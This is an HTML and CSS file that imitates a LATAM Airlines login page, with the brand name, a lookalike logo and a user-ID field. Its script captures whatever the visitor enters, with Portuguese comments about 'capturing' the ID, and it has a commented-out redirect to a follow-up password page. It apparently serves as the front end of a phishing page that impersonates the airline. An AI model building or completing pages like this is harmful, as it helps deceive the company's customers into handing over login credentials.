<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LATAM Airlines - Login</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');

  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    background: #f3f0f9;
    min-height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    background-image: url("data:image/svg+xml,%3Csvg width='1200' height='800' viewBox='0 0 1200 800' xmlns='http://www.w3.org/2000/svg'%3E%3Crect fill='%23f3f0f9' width='1200' height='800'/%3E%3Cpath d='M0 500 Q300 420 600 480 T1200 450 V800 H0 Z' fill='%23e8e0f5' opacity='0.6'/%3E%3Cpath d='M0 550 Q400 480 800 520 T1200 500 V800 H0 Z' fill='%23ddd4f0' opacity='0.5'/%3E%3Ccircle cx='180' cy='180' r='40' fill='%23e0d6f5' opacity='0.5'/%3E%3Ccircle cx='280' cy='140' r='25' fill='%23e0d6f5' opacity='0.4'/%3E%3Ccircle cx='900' cy='160' r='35' fill='%23e0d6f5' opacity='0.45'/%3E%3Ccircle cx='1000' cy='120' r='20' fill='%23e0d6f5' opacity='0.4'/%3E%3Cpath d='M150 220 L280 180 L320 200 L200 250 Z' fill='%23d4c8f0' opacity='0.6'/%3E%3Cpath d='M950 200 L1050 170 L1080 190 L1000 230 Z' fill='%23d4c8f0' opacity='0.5'/%3E%3Crect x='50' y='480' width='180' height='90' rx='8' fill='%23dcd2f0' opacity='0.7'/%3E%3Crect x='80' y='500' width='30' height='40' fill='%23c9bce8'/%3E%3Crect x='130' y='500' width='30' height='40' fill='%23c9bce8'/%3E%3Crect x='1000' y='420' width='40' height='180' fill='%23d4c8f0' opacity='0.8'/%3E%3Crect x='1045' y='380' width='30' height='40' fill='%23d4c8f0' opacity='0.7'/%3E%3Cpath d='M1020 380 L1050 340 L1080 380' fill='none' stroke='%23c9bce8' stroke-width='4'/%3E%3C/svg%3E");
    background-size: cover;
    background-position: center;
  }

  .card {
    background: #ffffff;
    width: 100%;
    max-width: 420px;
    border-radius: 16px;
    box-shadow: 0 12px 40px rgba(0, 0, 0, 0.08);
    overflow: hidden;
    border-top: 4px solid #2b1e6b;
  }

  .card-inner {
    padding: 40px 36px 32px;
  }

  .logo {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 32px;
  }

  .logo-icon {
    width: 36px;
    height: 36px;
  }

  .logo-text {
    font-size: 15px;
    font-weight: 700;
    color: #1a1a2e;
    letter-spacing: 0.3px;
    line-height: 1.15;
  }

  .logo-text span {
    display: block;
    font-size: 11px;
    font-weight: 600;
    letter-spacing: 1.2px;
    color: #1a1a2e;
  }

  h1 {
    font-size: 26px;
    font-weight: 600;
    color: #1e1b4b;
    margin-bottom: 10px;
    line-height: 1.25;
  }

  .subtitle {
    font-size: 14px;
    color: #5b5675;
    margin-bottom: 28px;
    line-height: 1.45;
  }

  .field {
    margin-bottom: 24px;
  }

  input[type="text"],
  input[type="email"] {
    width: 100%;
    padding: 14px 16px;
    border: 1px solid #d1d5db;
    border-radius: 8px;
    font-size: 15px;
    color: #1f2937;
    background: #fff;
    transition: border-color 0.2s, box-shadow 0.2s;
  }

  input::placeholder {
    color: #9ca3af;
  }

  input:focus {
    outline: none;
    border-color: #e11d48;
    box-shadow: 0 0 0 3px rgba(225, 29, 72, 0.12);
  }

  .btn-continue {
    width: 100%;
    background: #e11d48;
    color: white;
    border: none;
    border-radius: 8px;
    padding: 15px;
    font-size: 16px;
    font-weight: 600;
    cursor: pointer;
    transition: background 0.2s;
    margin-bottom: 20px;
  }

  .btn-continue:hover {
    background: #be123c;
  }

  .btn-continue:active {
    background: #9f1239;
  }

  .create-account {
    text-align: center;
    margin-bottom: 28px;
  }

  .create-account a {
    color: #e11d48;
    font-size: 15px;
    font-weight: 600;
    text-decoration: none;
  }

  .create-account a:hover {
    text-decoration: underline;
  }

  .divider {
    height: 1px;
    background: #e5e7eb;
    margin-bottom: 20px;
  }

  .regain {
    text-align: center;
    font-size: 13.5px;
    color: #6b7280;
  }

  .regain a {
    color: #2563eb;
    text-decoration: none;
    font-weight: 500;
  }

  .regain a:hover {
    text-decoration: underline;
  }

  @media (max-width: 480px) {
    .card-inner {
      padding: 32px 24px 28px;
    }
    h1 {
      font-size: 22px;
    }
  }
</style>
</head>
<body>

  <div class="card">
    <div class="card-inner">
      
      <!-- Logo -->
      <div class="logo">
        <svg class="logo-icon" viewBox="0 0 40 40" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M8 28L20 6L32 28H26L20 16L14 28H8Z" fill="#E11D48"/>
          <path d="M14 28L20 18L26 28H14Z" fill="#BE123C"/>
          <path d="M18 22H22L20 18L18 22Z" fill="#E11D48"/>
        </svg>
        <div class="logo-text">
          LATAM
          <span>AIRLINES</span>
        </div>
      </div>

      <h1>Please enter your user ID</h1>
      <p class="subtitle">If you are already a LATAM member, please enter your log in details:</p>

      <form id="loginForm">
        <div class="field">
          <input 
            type="text" 
            id="userId" 
            name="userId" 
            placeholder="Email or membership number" 
            autocomplete="username"
            required
          >
        </div>

        <button type="submit" class="btn-continue">Continue</button>
      </form>

      <div class="create-account">
        <a href="#">Create account</a>
      </div>

      <div class="divider"></div>

      <div class="regain">
        Can’t log in to your account? <a href="#">Regain access</a>
      </div>

    </div>
  </div>

<script>
  document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const userId = document.getElementById('userId').value.trim();
    
    // Aqui você captura o user ID
    console.log('User ID capturado:', userId);
    
    // Depois redireciona ou mostra a tela de senha
    // window.location.href = 'password.html'; // se for multi-step
  });
</script>

</body>
</html>
